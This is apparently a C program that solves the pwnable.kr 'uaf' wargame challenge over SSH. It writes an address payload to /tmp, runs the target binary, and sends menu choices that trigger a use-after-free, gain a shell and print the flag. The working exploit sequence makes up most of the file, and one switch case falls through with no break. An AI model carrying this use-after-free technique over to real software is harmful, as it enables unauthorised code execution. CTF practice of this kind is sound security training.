#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include "required/intrinsic.h"
#include "required/nix.h"
#include "required/memory.h"
#include "required/platform.h"
#include "required/assert.h"
#include "marray.h"
#include "string.h"
#include "queue.h"
#include "nix_socket.h"
#include "ssh.h"

enum modes { STAGE0,STAGE1,STAGE2,STAGE3,STAGE4,STAGE5,STAGE6,STAGE7,STAGE8,STAGE9,STAGE10,STAGE11 };
modes mode = STAGE0;
struct ssh ssh={};
bool isFin = false;

void ReceiveMsgs(char *message)
{
	if (message)
	{
		//printf("|%s|\n",message);
		switch(mode)
		{
			case STAGE0:
			{

				printf("Creating directory..\n");
				s32 *createDir = S32("mkdir /tmp/pbot/\n");
				libssh2_channel_write(ssh.channel,createDir,Strlen(createDir));
				mode = STAGE1;
				break;
			}
			case STAGE1:
			{
				//NOTES(): Create the payload file and put it in /tmp/pbot
				if (StrCmp(message,"uaf@ubuntu:~$ "))
				{
					printf("Creating file..\n");
					s32 *file = S32("python -c \"print '\\x88\\x15\\x40\\x00\\x00\\x00\\x00\\x00'\" > /tmp/pbot/payload.txt\n");
					libssh2_channel_write(ssh.channel,file,Strlen(file));
					Free(file);
					file=NULL;
					mode = STAGE2;
				}
				break;
			}
			case STAGE2:
			{

				if (StrCmp(message,"uaf@ubuntu:~$ "))
				{
					printf("Checking if file exist..\n");
					s32 *checkFileCommand = S32("ls /tmp/pbot/payload.txt\n");
					libssh2_channel_write(ssh.channel,checkFileCommand,Strlen(checkFileCommand));

					if (checkFileCommand)
					{
						Free(checkFileCommand);
						checkFileCommand=NULL;
					}

					mode = STAGE3;
				}
				break;
			}
			case STAGE3:
			{
				if (StrCmp(message,"/tmp/pbot/payload.txt"))
				{
					printf("file exist\n");
					mode = STAGE4;
				}
				break;
			}
			case STAGE4:
			{
				if (StrCmp(message,"uaf@ubuntu:~$ "))
				{
					printf("Executing file with Expliot.\n");
					s32 *executeFile= S32("./uaf 17 /tmp/pbot/payload.txt\n");
					libssh2_channel_write(ssh.channel,executeFile,Strlen(executeFile));

					if (executeFile)
					{
						Free(executeFile);
						executeFile=NULL;
					}
					mode = STAGE5;
				}
				break;
			}
			case STAGE5:
			{
				if (StrCmp(message,"3. free"))
				{
					printf("Freeing memory..\n");
					s32 *freeOne = S32("3\n");
					libssh2_channel_write(ssh.channel,freeOne,Strlen(freeOne));

					if (freeOne)
					{
						Free(freeOne);
						freeOne = NULL;
					}
					mode = STAGE6;
				}
				break;
			}
			case STAGE6:
			{
				if (StrCmp(message,"3. free"))
				{
					printf("Allocating Memory\n");
					s32 *allocMem = S32("2\n");
					libssh2_channel_write(ssh.channel,allocMem,Strlen(allocMem));
					
					if (allocMem)
					{
						Free(allocMem);
						allocMem = NULL;
					}
					
					mode = STAGE7;
				}
				break;
			}
			case STAGE7:
			{
				if (StrCmp(message,"your data is allocated"))
				{
					printf("Allocating more Memory\n");
					s32 *allocMoreMem = S32("2\n");
					libssh2_channel_write(ssh.channel,allocMoreMem,Strlen(allocMoreMem));

					if (allocMoreMem)
					{
						Free(allocMoreMem);
						allocMoreMem=NULL;
					}
					mode = STAGE8;
				}
				break;
			}
			case STAGE8:
			{
				if (StrCmp(message,"your data is allocated"))
				{
					printf("Executing shell..\n");
					s32 *execOne = S32("1\n");
					libssh2_channel_write(ssh.channel,execOne,Strlen(execOne));

					if (execOne)
					{
						Free(execOne);
						execOne=NULL;
					}
					mode = STAGE9;
				}
				break;
			}
			case STAGE9:
			{
				if (StrCmp(message,"$ "))
				{
					printf("Capturing flag\n");
					s32 *catFlagString = S32("cat flag\n");
					libssh2_channel_write(ssh.channel,catFlagString,Strlen(catFlagString));

					if (catFlagString)
					{
						Free(catFlagString);
						catFlagString=NULL;

					}
					mode = STAGE10;
				}

			}
			case STAGE10:
			{
				if (StrCmp(message,"cat flag"))
				{
					mode = STAGE11;
				}
				break;
			}
			case STAGE11:
			{
				if (message)
				{
					if (StrCmp(message,"$ "))
					{
						isFin = true;
					} else {
						printf("%s\n",message);
					}
				}
				break;
			}
		}
	}
}

int main()
{
	char *username = "uaf";
	char *password = "guest";

	SSH(&ssh,"pwnable.kr",2222,username,password,ReceiveMsgs, &isFin);
}
